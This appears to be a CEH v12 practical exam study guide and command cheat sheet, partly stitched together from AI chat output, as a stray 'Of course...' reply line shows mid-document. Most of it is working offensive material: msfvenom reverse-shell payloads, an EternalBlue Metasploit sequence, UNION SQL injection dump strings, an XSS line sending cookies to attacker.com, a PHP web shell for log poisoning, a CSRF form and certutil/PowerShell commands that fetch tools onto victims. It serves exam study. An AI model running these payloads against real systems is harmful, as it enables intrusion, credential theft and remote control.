
***

# CEH v12 Practical Exam - Ultimate Master Reference

> **⚠️ Important Disclaimer:** This document is for **educational purposes and exam preparation only**. The techniques and tools described must only be used on systems you own or have explicit, written permission to test. Unauthorized access to computer systems is illegal and unethical.

## 📚 Table of Contents
1.  [Exam Overview & Best Practices](#-exam-overview--best-practices)
2.  [Module 1: Reconnaissance](#-module-1-reconnaissance)
3.  [Module 2: Vulnerability Analysis](#-module-2-vulnerability-analysis)
4.  [Module 3: System Hacking](#-module-3-system-hacking)
5.  [Module 4: Web Application Penetration Testing](#-module-4-web-application-penetration-testing)
6.  [Module 5: Network Penetration Testing](#-module-5-network-penetration-testing)
7.  [Module 6: Cryptography & Steganography](#-module-6-cryptography--steganography)
8.  [Module 7: Cloud & IoT (Conceptual)](#-module-7-cloud--iot-conceptual)
9.  [Toolbox: Command Cheat Sheet](#-toolbox-command-cheat-sheet)

---

## 🎯 Exam Overview & Best Practices

### Core Mindset for the Exam:
*   **It's a practical exam:** You need to perform tasks, not just answer theory.
*   **It's a open-book exam (within the environment):** You can use help menus, man pages, and your own notes. This guide is ideal for that.
*   **Flags are key:** You will find flags (`{flag_XXXX}`) as proof of completion for each task.

### Golden Rules:
1.  **DOCUMENT EVERYTHING:** Take screenshots of every command and its output. The exam interface will have a method for this.
2.  **READ QUESTIONS CAREFULLY:** Understand exactly what is being asked before you start. Don't overcomplicate it.
3.  **USE THE PROVIDED TOOLS:** The exam environment will have all necessary tools (Nmap, Metasploit, Burp Suite, etc.) pre-installed.
4.  **MANAGE YOUR TIME:** The exam is time-bound. If you're stuck on a task for more than 10-15 minutes, flag it and move on. You can return later.
5.  **KNOW YOUR BASIC COMMANDS:** Be fluent in basic Linux (`ls`, `cd`, `cp`, `grep`, `find`) and Windows (`dir`, `cd`, `ipconfig`, `whoami`) CLI commands.

---

## 🔍 Module 1: Reconnaissance

### Passive Reconnaissance (OSINT)
*   **`whois`**: Query WHOIS databases for domain registration info.
    ```bash
    whois example.com
    ```
*   **`nslookup` / `dig`**: DNS enumeration. Find IP addresses, mail servers, name servers.
    ```bash
    nslookup example.com
    dig ANY example.com @8.8.8.8
    ```
*   **`theHarvester`**: Gather emails, subdomains, hosts.
    ```bash
    theHarvester -d example.com -l 100 -b google
    ```

### Active Reconnaissance & Scanning
*   **Ping Sweep:** Discover live hosts.
    ```bash
    # Nmap ping sweep
    nmap -sn 192.168.1.0/24

    # With bash (if nmap not available)
    for i in {1..254}; do ping -c 1 192.168.1.$i | grep "bytes from"; done
    ```
*   **Port Scanning (Nmap is your best friend):**
    ```bash
    # TCP Connect Scan (completes full handshake, noisy)
    nmap -sT 192.168.1.105

    # SYN Stealth Scan (half-open, quieter)
    nmap -sS 192.168.1.105

    # Version Detection (what's running on the open ports?)
    nmap -sV 192.168.1.105

    # Aggressive Scan (OS detection, version, script scanning, traceroute)
    nmap -A 192.168.1.105

    # Scan all TCP ports (slower)
    nmap -p- 192.168.1.105

    # Scan specific ports
    nmap -p 80,443,22,21 192.168.1.105
    ```
*   **Banner Grabbing:** Identify service versions.
    ```bash
    # Netcat
    nc -nv 192.168.1.105 80
    # Then type: HEAD / HTTP/1.0

    # Nmap version detection (-sV) does this automatically.
    # Telnet
    telnet 192.168.1.105 25
    ```

---

## 🕵️ Module 2: Vulnerability Analysis

*   **Nmap NSE (Nmap Scripting Engine):** The built-in vulnerability scanner.
    ```bash
    # Run default safe scripts
    nmap --script safe 192.168.1.105

    # Run all vulnerability scripts (very noisy)
    nmap --script vuln 192.168.1.105

    # Run specific category (e.g., all http scripts)
    nmap --script "http-*" 192.168.1.105

    # Run a specific script
    nmap --script http-sql-injection 192.168.1.105
    ```
*   **Nessus / OpenVAS:** GUI-based scanners. The exam will likely have a task to launch a scan and interpret the results. Know how to identify High/Critical vulnerabilities.

---

## 💻 Module 3: System Hacking

### Password Attacks
*   **John the Ripper:** Password cracking.
    ```bash
    # Crack a password file (using a wordlist like rockyou.txt)
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

    # Show cracked passwords
    john --show hashes.txt

    # Crack SSH private key
    ssh2john id_rsa > id_rsa_hash
    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash
    ```
*   **Hashcat (GPU-based, faster):**
    ```bash
    # Crack MD5 hashes
    hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
    ```

### Metasploit Framework
*   **`msfvenom`:** Payload creation.
    ```bash
    # Windows Reverse Shell
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f exe -o shell.exe

    # Linux Reverse Shell
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -f elf -o shell.elf

    # PHP Reverse Shell
    msfvenom -p php/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=4444 -o shell.php
    ```
*   **`msfconsole`:** The Metasploit interface.
    ```bash
    # Start Metasploit
    msfconsole

    # Use an exploit module
    use exploit/windows/smb/ms17_010_eternalblue

    # Set required options
    set RHOSTS 192.168.1.105
    set LHOST YOUR_IP
    set PAYLOAD windows/x64/meterpreter/reverse_tcp

    # Run the exploit
    run

    # In a meterpreter session
    meterpreter > getuid
    meterpreter > sysinfo
    meterpreter > shell # To get a standard OS shell
    ```

### Privilege Escalation
*   **Windows:**
    ```cmd
    :: System Information
    systeminfo
    whoami /priv

    :: Find weak file permissions
    icacls "C:\Program Files\Vulnerable Software\*"

    :: Automated scripts (UPLOAD THESE FIRST)
    :: The correct way to execute them from the command prompt:
    WinPEASany.exe
    Seatbelt.exe

    :: If the current directory is not in your PATH, you might need to specify it (but usually you run it from the dir it's in)
    :: C:\Tools\WinPEASany.exe
    ```
    **Crucial Note:** You must first *upload* these tools (WinPEAS, Seatbelt) from your attacking machine to the victim Windows machine.
    *   **From a Meterpreter session:** Use the `upload` command.
        ```bash
        meterpreter > upload /usr/share/windows-resources/winpeas/winpeasany.exe C:\\Windows\\Temp\\
        meterpreter > upload /opt/Seatbelt/Seatbelt.exe C:\\Windows\\Temp\\
        meterpreter > shell
        C:\Windows\Temp> winpeasany.exe
        ```
    *   **From a standard shell:** Use a web server and `certutil`.
        ```bash
        # On YOUR attacking machine (Kali):
        python3 -m http.server 80

        # On the VICTIM Windows machine (cmd.exe):
        certutil -urlcache -f http://YOUR_IP/winpeasany.exe winpeasany.exe
        winpeasany.exe
        ```
*   **Linux:**
    ```bash
    # System Information
    uname -a
    sudo -l # Check sudo rights

    # Find SUID/GUID files
    find / -perm -u=s -type f 2>/dev/null
    find / -perm -g=s -type f 2>/dev/null

    # Check crontabs
    crontab -l
    ls -la /etc/cron*

    # Automated scripts
    ./linpeas.sh
    ```

---

## 🌐 Module 4: Web Application Penetration Testing

### SQL Injection (SQLi)
*   **Detection:**
    `http://vulnerable-site.com/products.php?id=1'`
    `http://vulnerable-site.com/products.php?id=1 AND 1=1-- -`
    `http://vulnerable-site.com/products.php?id=1 AND 1=2-- -`
*   **Exploitation:**
    ```bash
    # Find number of columns
    http://vulnerable-site.com/products.php?id=1 ORDER BY 1-- -
    http://vulnerable-site.com/products.php?id=1 ORDER BY 10-- - # Increase until error

    # Union-based injection (if 4 columns found)
    http://vulnerable-site.com/products.php?id=-1 UNION SELECT 1,2,3,4-- -

    # Extract database name
    http://vulnerable-site.com/products.php?id=-1 UNION SELECT 1,2,3,database()-- -

    # Extract table names
    http://vulnerable-site.com/products.php?id=-1 UNION SELECT 1,2,3,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()-- -

    # Extract column names from 'users' table
    http://vulnerable-site.com/products.php?id=-1 UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'-- -

    # Dump data
    http://vulnerable-site.com/products.php?id=-1 UNION SELECT 1,2,3,group_concat(username,0x3a,password) FROM users-- -
    ```
*   **`sqlmap` (Automation):**
    ```bash
    # Basic test
    sqlmap -u "http://vulnerable-site.com/products.php?id=1"

    # Dump the entire database
    sqlmap -u "http://vulnerable-site.com/products.php?id=1" --dump-all
    ```

### Cross-Site Scripting (XSS)
*   **Test Payloads:**
    ```html
    <script>alert('XSS')</script>
    <img src=x onerror=alert('XSS')>
    "><script>alert('XSS')</script>
    ```
*   **Steal Cookies:**
    ```html
    <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
    ```

### File Inclusion (LFI/RFI)
*   **Local File Inclusion (LFI):**
    `http://vulnerable-site.com/index.php?page=../../../../etc/passwd`
    `http://vulnerable-site.com/index.php?page=....//....//....//etc/passwd` (double encoding)
*   **Log Poisoning (to get RCE):**
    1.  Find the log path (e.g., `/var/log/apache2/access.log`).
    2.  Poison the User-Agent string with PHP code: `<?php system($_GET['cmd']); ?>`.
    3.  Include the log file: `http://vulnerable-site.com/index.php?page=/var/log/apache2/access.log&cmd=id`

### Cross-Site Request Forgery (CSRF)
*   **Create a PoC HTML file:**
    ```html
    <html>
      <body onload="document.forms[0].submit()">
        <form action="http://vulnerable-site.com/change_email" method="POST">
          <input type="hidden" name="email" value="hacker@evil.com">
        </form>
      </body>
    </html>
    ```

---

## 📡 Module 5: Network Penetration Testing

### Sniffing & MITM
*   **Wireshark:** GUI tool. Use filters: `arp`, `tcp.port == 80`, `http.request`, `dns`.
*   **`tcpdump` (CLI):**
    ```bash
    # Capture on interface
    tcpdump -i eth0

    # Capture specific host and port
    tcpdump -i eth0 host 192.168.1.105 and port 80
    ```

### Social Engineering Toolkit (SET)
*   Often used for phishing campaigns. The exam may have a task to create a spear-phishing email using SET.
    ```bash
    setoolkit
    > 1) Social-Engineering Attacks
    > 2) Website Attack Vectors
    > 3) Credential Harvester Attack Method
    > 2) Site Cloner
    ```

---

## 🧮 Module 6: Cryptography & Steganography

### Hash Identification
*   **By Length:**
    *   **32 chars:** MD5, MD4
    *   **40 chars:** SHA-1
    *   **64 chars:** SHA-256
    *   **128 chars:** SHA-512

### Steganography
*   **`steghide`:** Hide/extract data from images/jpegs.
    ```bash
    # Extract data (if you know the passphrase)
    steghide extract -sf image.jpg -p 'pass123'

    # Info about a file
    steghide info image.jpg
    ```
*   **`strings`:** Find plaintext hidden in files.
    ```bash
    strings image.jpg | grep -i flag
    ```
*   **`binwalk`:** Analyze files for embedded data and extract it.
    ```bash
    binwalk image.jpg
    binwalk -e image.jpg # Extracts embedded files
    ```
*   **`zsteg`:** Detect stegano-hidden data in PNG and BMP files.
    ```bash
    zsteg image.png
    ```

---

## ☁️ Module 7: Cloud & IoT (Conceptual)

*   **Cloud (AWS S3):** Look for misconfigured, publicly readable buckets.
    ```bash
    # Curl a bucket
    curl http://s3.amazonaws.com/bucketname/

    # Use AWS CLI (if configured)
    aws s3 ls s3://bucketname/
    aws s3 cp s3://bucketname/secret.txt .
    ```
*   **IoT:** Default credentials are a major issue. Always try `admin:admin`, `root:root`, `admin:password`.

---

## 🧰 Toolbox: Command Cheat Sheet

| Tool | Command | Purpose |
| :--- | :--- | :--- |
| **`nmap`** | `nmap -sS -sV -A <target>` | Stealth scan with version and OS detection |
| **`netcat`** | `nc -nv <target> <port>` | Banner grabbing / manual service interaction |
| **`john`** | `john --wordlist=rockyou.txt hashes.txt` | Password cracking |
| **`msfvenom`** | `msfvenom -p windows/meterpreter/reverse_tcp LHOST=X LPORT=Y -f exe > shell.exe` | Generate a Windows payload |
| **`sqlmap`** | `sqlmap -u "http://site.com/page?id=1" --dump-all` | Automate SQL injection |
| **`steghide`** | `steghide extract -sf file.jpg -p 'pass'` | Extract hidden data from an image |
| **`curl`** | `curl -X POST -d "param=value" http://site.com/login` | Interact with web apps from CLI |
| **`find` (Lin)** | `find / -perm -u=s -type f 2>/dev/null` | Find SUID files for priv esc |
| **`whoami /priv` (Win)** | `whoami /priv` | Check Windows user privileges |
| **`WinPEASany.exe` (Win)** | `WinPEASany.exe` | Run Windows priv esc enumerator (after upload) |

Of course. This is a critical skill for the exam and real-world penetration testing. Here is the new chapter to add to the master reference document.

***

## 📤 Module 8: Data Exfiltration & File Transfers

A common exam task is to upload a tool (like WinPEAS/LinPEAS) to a target or download a flag file from it. The method you use depends entirely on which services are available.

### Core Concept: The "Push" vs. "Pull" Method
*   **Push:** You host the file on your machine and the *target pulls* it down.
*   **Pull:** You upload the file from your machine to the target (often trickier and requires specific services).

---

### 1. Using HTTP/S (The Most Reliable Method)
This is often the easiest way. You host a simple web server on your attacking machine and use tools on the target to download the file.

**On Your Attacking Machine (Kali):**
```bash
# Python 3 (Best option)
python3 -m http.server 80      # Serve on port 80 (HTTP)
python3 -m http.server 443     # Serve on port 443 (HTTPS-like)

# Python 2 (if needed)
python2 -m SimpleHTTPServer 80
```

**On the Target Machine:**
*   **Linux Target (`wget`, `curl`):**
    ```bash
    wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
    curl http://YOUR_IP/linpeas.sh -o /tmp/linpeas.sh
    ```
*   **Windows Target (`certutil`, `powershell`, `bitsadmin`):**
    ```cmd
    :: Certutil (Classic, but often flagged by AV now)
    certutil -urlcache -f http://YOUR_IP/winpeasany.exe winpeasany.exe

    :: PowerShell (Modern, very effective)
    powershell -c "Invoke-WebRequest -Uri 'http://YOUR_IP/winpeasany.exe' -OutFile 'winpeasany.exe'"
    powershell -c "(New-Object Net.WebClient).DownloadFile('http://YOUR_IP/winpeasany.exe', 'winpeasany.exe')"

    :: BITSAdmin (Lives off the land)
    bitsadmin /transfer myjob /download /priority normal http://YOUR_IP/winpeasany.exe C:\Windows\Temp\winpeasany.exe
    ```

---

### 2. Using FTP (If an FTP Server is Running)
If the target has an FTP server you can access (e.g., you found credentials), you can upload files to it.

**On Your Attacking Machine:**
```bash
# Connect to the target's FTP server to UPLOAD a file (PUSH)
ftp TARGET_IP
> put /path/on/your/machine/winpeasany.exe
> exit

# Alternatively, start your OWN FTP server for the target to PULL from.
# Using Python pyftpdlib:
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w # -w allows write access (uploads)

# Using pure-ftpd (Kali)
sudo systemctl start pure-ftpd
```
**On the Target Machine:**
```bash
# Linux target connecting to YOUR FTP server
ftp YOUR_IP
> get linpeas.sh
> exit

# Windows target connecting to YOUR FTP server
ftp YOUR_IP
> get winpeasany.exe
> exit
```

---

### 3. Using SCP/SFTP (If SSH is Open)
This is a secure and efficient method if you have SSH credentials on the target.

**From Your Attacking Machine:**
```bash
# Upload a file TO the target (PUSH)
scp /path/to/linpeas.sh username@TARGET_IP:/tmp/linpeas.sh

# Download a file FROM the target (PULL)
scp username@TARGET_IP:/path/to/flag.txt ./
```

---

### 4. Using SMB (Windows File Sharing)
If you can create an SMB share, you can easily transfer files.

**On Your Attacking Machine (Kali):**
```bash
# Create a simple SMB share
sudo impacket-smbserver share-name /path/to/your/files -smb2support -username user -password pass
```
**On the Target Windows Machine:**
```cmd
# Map the network drive and copy the file (if allowed)
net use Z: \\YOUR_IP\share-name /user:user pass
copy Z:\winpeasany.exe .

# Or copy directly without mapping a drive
copy \\YOUR_IP\share-name\winpeasany.exe .
```

---

### 5. Using Metasploit/Meterpreter
This is often the simplest method once you have a initial shell.

**From a Meterpreter Session:**
```bash
# UPLOAD a file from your machine to the target
meterpreter > upload /path/to/winpeasany.exe C:\\Windows\\Temp\\

# DOWNLOAD a file from the target to your machine
meterpreter > download C:\\Users\\Victim\\secret.txt ./

# The meterpreter shell will automatically use the established connection.
```

---

### 6. Using Netcat (The "Last Resort" Method)
Netcat can be used to transfer raw data over any port. This is noisy and unstable for large files but can work in restricted environments.

**On the RECEIVING Machine (waiting for the file):**
```bash
# Linux (Receiver)
nc -lvnp 4444 > received_file

# Windows (Receiver)
nc.exe -lvnp 4444 > received_file
```

**On the SENDING Machine (initiating the transfer):**
```bash
# Linux (Sender)
nc -w 3 RECEIVER_IP 4444 < file_to_send

# Windows (Sender)
nc.exe -w 3 RECEIVER_IP 4444 < file_to_send.exe
```

---

### Summary Table: How to Get Your Tools On Target

| Your Situation | Best Method | Command (On Your Machine) | Command (On Target) |
| :--- | :--- | :--- | :--- |
| **You have ANY shell** | **HTTP Server** | `python3 -m http.server 80` | `curl/wget/certutil/powershell` |
| **You have Meterpreter** | **Meterpreter Upload** | `meterpreter > upload file` | (N/A) |
| **Target has FTP** | **FTP** | `ftp target_ip` + `put file` | `ftp your_ip` + `get file` |
| **Target has SSH** | **SCP** | `scp file user@target_ip:/path/` | (N/A) |
| **Target is Windows** | **SMB Share** | `impacket-smbserver ...` | `copy \\your_ip\file .` |
| **Nothing else works** | **Netcat** | `nc -lvnp 4444 > file` (recv) | `nc your_ip 4444 < file` (send) |

**Exam Tip:** The **Python HTTP Server** method is the most universal and least likely to be blocked by basic firewalls. It should be your first attempt in most scenarios. Always have a server ready (`python3 -m http.server 80`) during the exam.

***
